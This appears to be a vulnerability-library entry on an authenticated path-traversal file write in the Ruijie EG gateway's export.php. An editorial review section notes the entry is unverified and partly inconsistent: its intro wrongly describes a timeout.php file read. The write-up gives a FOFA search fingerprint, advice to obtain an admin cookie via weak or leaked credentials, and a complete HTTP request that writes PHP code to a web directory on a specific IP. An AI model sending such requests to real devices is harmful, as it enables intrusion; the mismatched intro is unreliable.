---
source: "wy876 漏洞文库"
id: "vw-0b05ae4842413bffe40b5ef4"
entity_id: "ve-0b05ae4842413bffe40b5ef4"
schema_version: "1"
fofa_unverified: "</font>"
title: "锐捷EG易网关export后台任意文件写入"
product: "Ruijie EG易网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "管理员Cookie；目标路径可写和PHP解析才有执行后果"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3export%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/rohc9xgqqcvcb1xr"
source_status: "recorded"
---

# 锐捷EG易网关export后台任意文件写入

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie EG易网关
- 本文讨论：vwan_pi/export.php filename穿越写文件
- 版本、权限与配置前提：管理员Cookie；目标路径可写和PHP解析才有执行后果
- 资料类型：后台文件写入PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 简介误写timeout.php文件读取，标题与实际export写入不同
- fofa提取成HTML标签
- 只有上传请求无回读或执行证据，正文执行命令过早推导
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 路径基准/写权限/解析配置/版本待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**

<font style="color:rgb(38, 38, 38);">锐捷EG易网关timeout.php后台任意文件读取漏洞 </font>

**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**

锐捷 EG易网关  
**<font style="color:rgb(38, 38, 38);">三、资产测绘</font>**  
<font style="color:rgb(38, 38, 38);">●登录页面</font>

<font style="color:rgb(38, 38, 38);">fofa:</font>`app="Ruijie-EG易网关" `


  
**<font style="color:rgb(38, 38, 38);">四、漏洞复现</font>**  
1通过弱口令或账号密码泄露漏洞登录后台获取cookie  


2通过上一步获取的cookie执行命令

```http
POST /vwan_pi/export.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=bnrul7jabde55u5moo2a4q57a0; helpKey=home_sys;user=admin
X-Requested-With: XMLHttpRequest
Host: 117.40.253.197:4430
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 53

content=<?php phpinfo();?>&filename=../../html/oo.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rohc9xgqqcvcb1xr>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
